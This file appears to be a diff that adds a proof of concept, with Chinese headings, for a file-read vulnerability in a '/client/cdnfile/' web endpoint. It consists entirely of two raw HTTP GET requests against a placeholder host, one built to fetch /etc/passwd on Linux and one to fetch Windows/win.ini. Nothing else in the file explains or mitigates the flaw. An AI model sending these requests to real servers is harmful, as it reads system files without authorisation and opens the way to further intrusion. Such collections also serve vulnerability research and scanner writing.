@@ -1,0 +1,16 @@
+##linux数据包
+
+GET /client/cdnfile/C/etc/passwd?linux HTTP/1.1
+Host: 11.11.11.11
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+Connection: close
+Accept-Encoding: gzip, deflate
+
+##windos数据包
+
+GET /client/cdnfile/1C/Windows/win.ini?windows HTTP/1.1
+Host: 11.11.11.11
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+Connection: close
+Accept-Encoding: gzip, deflate
+
